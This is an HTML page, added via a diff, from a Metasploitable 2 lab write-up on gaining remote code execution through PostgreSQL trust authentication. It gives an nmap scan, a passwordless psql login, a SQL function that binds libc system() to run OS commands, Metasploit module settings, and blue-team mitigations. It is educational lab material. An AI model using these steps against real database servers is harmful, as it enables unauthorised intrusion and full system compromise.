@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PostgreSQL — Remote Code Execution | Metasploitable 2 Lab</title>
+  <link rel="stylesheet" href="../assets/css/style.css" />
+</head>
+<body>
+
+<nav class="site-nav">
+  <div class="container nav-inner">
+    <a class="nav-brand" href="../index.html">
+      <div class="brand-icon">M2</div>
+      <div class="brand-text"><h1>Metasploitable 2</h1><p>Penetration Testing Lab</p></div>
+    </a>
+    <div class="nav-links">
+      <a class="nav-link" href="../index.html#overview">Overview</a>
+      <a class="nav-link" href="../index.html#scan">Nmap Scan</a>
+      <a class="nav-link" href="../index.html#modules">Modules</a>
+    </div>
+    <a class="nav-btn btn" href="../index.html#modules">All Modules</a>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="breadcrumb">
+    <a href="../index.html">Home</a><span>/</span>
+    <a href="../index.html#modules">Modules</a><span>/</span>
+    <span style="color:var(--text)">PostgreSQL</span>
+  </div>
+</div>
+
+<div class="module-hero">
+  <div class="container">
+    <div class="module-hero-top">
+      <div class="module-title-wrap">
+        <p class="section-label">Port 5432/tcp — PostgreSQL Database</p>
+        <h2>PostgreSQL — Remote Code Execution via Trust Authentication</h2>
+        <p class="sub-title">Exploiting Misconfigured Trust Auth for System Command Execution</p>
+        <div class="overview-pills">
+          <span class="pill">CVE: <strong>N/A (Misconfiguration)</strong></span>
+          <span class="pill">Port: <strong>5432/tcp</strong></span>
+          <span class="pill">Impact: <strong>Remote Shell</strong></span>
+          <span class="pill">Tool: <strong>Metasploit</strong></span>
+        </div>
+      </div>
+      <span class="badge badge-high" style="font-size:.85rem;padding:.4rem 1rem">High</span>
+    </div>
+    <div class="overview-box">
+      <div class="overview-box-grid">
+        <div><div class="ov-item-label">Service</div><div class="ov-item-value">PostgreSQL</div></div>
+        <div><div class="ov-item-label">Attack Type</div><div class="ov-item-value">Auth Bypass + RCE</div></div>
+        <div><div class="ov-item-label">MSF Module</div><div class="ov-item-value mono">exploit/multi/postgres/postgres_payload</div></div>
+        <div><div class="ov-item-label">Result</div><div class="ov-item-value" style="color:var(--red)">✓ Remote Shell Obtained</div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="content-layout">
+    <main class="content-body">
+
+      <div class="step-section" id="service-overview">
+        <div class="step-label"><div class="step-num">01</div><h3>Vulnerability Overview</h3></div>
+        <p>PostgreSQL on Metasploitable 2 is configured with <strong>trust authentication</strong>, allowing passwordless login from any local or remote connection. Once authenticated, attackers can create user-defined functions to execute system commands, leading to remote code execution.</p>
+        <div class="callout">
+          Trust authentication bypasses password checks entirely. Combined with PostgreSQL's ability to run OS commands, this leads to full system compromise.
+        </div>
+      </div>
+
+      <div class="step-section" id="enumeration">
+        <div class="step-label"><div class="step-num">02</div><h3>Service Detection</h3></div>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">nmap</span> <span class="kw">-sV -v -p 5432</span> <span class="str">&lt;target-ip&gt;</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Nmap PostgreSQL Service Version Scan</span>
+          </div>
+          <img src="../PostgreSQL/Nmap_PostgreSQL_Service_Scan.png" alt="PostgreSQL Nmap" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="auth-bypass">
+        <div class="step-label"><div class="step-num">03</div><h3>Authentication Bypass</h3></div>
+        <p>Connect to PostgreSQL without password using psql:</p>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">psql</span> <span class="kw">-h &lt;target-ip&gt; -U postgres</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">PostgreSQL Trust Authentication Bypass</span>
+          </div>
+          <img src="../PostgreSQL/PostgreSQL_Auth_Bypass.png" alt="PostgreSQL Auth Bypass" loading="lazy" />
+        </div>
+        <p>Due to trust auth, no password is required.</p>
+      </div>
+
+      <div class="step-section" id="rce">
+        <div class="step-label"><div class="step-num">04</div><h3>Remote Code Execution</h3></div>
+        <p>Create a user-defined function to execute system commands:</p>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">sql</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block">CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT;
+SELECT system('id');</pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">PostgreSQL UDF for System Command Execution</span>
+          </div>
+          <img src="../PostgreSQL/PostgreSQL_RCE.png" alt="PostgreSQL RCE" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="metasploit">
+        <div class="step-label"><div class="step-num">05</div><h3>Automated Exploitation — Metasploit</h3></div>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">msfconsole</span>
+<span class="kw">use</span> <span class="pth">exploit/multi/postgres/postgres_payload</span>
+<span class="kw">set</span> RHOSTS <span class="str">&lt;target-ip&gt;</span>
+<span class="kw">set</span> USERNAME postgres
+<span class="kw">run</span></pre>
+        </div>
+      </div>
+
+      <div class="step-section" id="results">
+        <div class="step-label"><div class="step-num">06</div><h3>Results &amp; Impact</h3></div>
+        <div class="results-box">
+          <h4>Outcome</h4>
+          <ul>
+            <li>Successfully bypassed authentication due to trust config</li>
+            <li>Executed system commands via UDF</li>
+            <li>Obtained remote shell access</li>
+            <li>Full database access with potential for data exfiltration</li>
+          </ul>
+        </div>
+        <div class="mitigation-box">
+          <h4>Detection &amp; Mitigation (Blue Team)</h4>
+          <ul>
+            <li>Change authentication method from 'trust' to 'md5' or stronger</li>
+            <li>Restrict PostgreSQL access to localhost only</li>
+            <li>Use firewall rules to block port 5432 externally</li>
+            <li>Monitor for suspicious UDF creation</li>
+            <li>Apply least privilege principles to database users</li>
+          </ul>
+        </div>
+      </div>
+
+    </main>
+    <aside class="toc">
+      <div class="toc-title">On This Page</div>
+      <a href="#service-overview">Overview</a>
+      <a href="#enumeration">Detection</a>
+      <a href="#auth-bypass">Auth Bypass</a>
+      <a href="#rce">RCE</a>
+      <a href="#metasploit">Metasploit</a>
+      <a href="#results">Results</a>
+    </aside>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="container footer-inner">
+    <div class="footer-left">← <a href="../index.html#modules" style="color:var(--cyan)">Back to Modules</a></div>
+    <div class="footer-links"><a href="./mysql.html">← MySQL</a><a href="./distccd.html">distccd →</a></div>
+  </div>
+</footer>
+<div id="lightbox" class="lightbox-overlay"><button class="lightbox-close">✕</button><img src="" alt="" /></div>
+<script src="../assets/js/app.js"></script>
+</body>
+</html></content>
+<parameter name="filePath">c:\Users\Digits\Documents\GitHub\metasploitable2-penetration-testing-lab\pages\postgresql.html
